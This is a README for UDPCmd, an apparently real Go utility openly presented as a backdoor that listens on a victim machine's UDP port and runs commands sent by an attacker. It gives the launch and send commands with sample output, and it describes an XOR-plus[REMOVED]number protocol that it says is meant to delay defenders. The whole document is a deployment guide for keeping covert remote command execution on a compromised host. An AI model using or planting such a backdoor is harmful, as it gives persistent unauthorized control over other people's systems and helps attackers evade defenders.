UDPCmd
======
UDPCmd is a multi-binary (a la busybox) which serves as a lightweight backdoor.

Its intended purpose is to sit quietly in the background for use in a
last-ditch effort to regain access if necessary.

Victim
------
On the victim, it binds to a UDP socket and listens for commands to run.  There
is at present no way to get the output directly.  Redirecting the output to a
file and downloading it with fileserv is an option, though.

Attacker
--------
On the attacker, it functions as a very crude shell, albiet with no output.

Example
-------
For the purposes of this example, `192.168.1.1` is attacking `192.168.2.2`
```sh
192.168.2.2
-----------
# nohup ./udpcmd >u.out &
# cat u.out
2016/02/21 21:04:08 Listening on 0.0.0.0:32922

192.168.1.1                                             
-----------                                             
$ rlwrap ./udpcmd -s -a 192.168.2.2:32922
2016/02/21 21:05:04 Ready to send to 192.168.2.2:32922
service ssh restart >/tmp/o 2>/tmp/e
2016/02/21 21:05:57 Sent.
```
The above starts UDPCmd listening on the victim, then a command is sent from
the attacker to the victim to restart sshd.  The output and error `/tmp/o` and
`/tmp/e` respectively, could be examined later if need be.

Protocol
--------
The protocol consists of 1024-byte datagrams sent from the attacker to the
victim.  The first byte is used XOR the remaining 1023.  Of the remaining 1023
bytes, the first few bytes are a magic number (currently the string `UDPCMD`).
The rest after that is the command to be executed, null-padded on the right.

This is, of course, not encryption, but should buy a few minutes of time while
the defenders poke around at it.

Security
--------
Aside from the magic number (which is changeable at compile time, by editing
`udpcmd.go`), there is next to 0 security.  In particular, there's no
authentication or encryption.

Usage
-----
```sh
Usage: udpcmd [options]

With -s, reads lines from stdin and sends them to the address given by -a.

Without -s, listens on the address given by -a (a port of 0 will cause a port
to be chosen at runtime), and executes commands sent to it.

Options:
  -a address
    	Listen or target address (depending on -s). (default "0.0.0.0:0")
  -s	Send a command.
```

Windows
-------
This should, in theory, work on Windows.  The code's there, but is totally
untested.  Feel free to submit a Pull Request if you test it, find it lacking,
and have a bugfix.
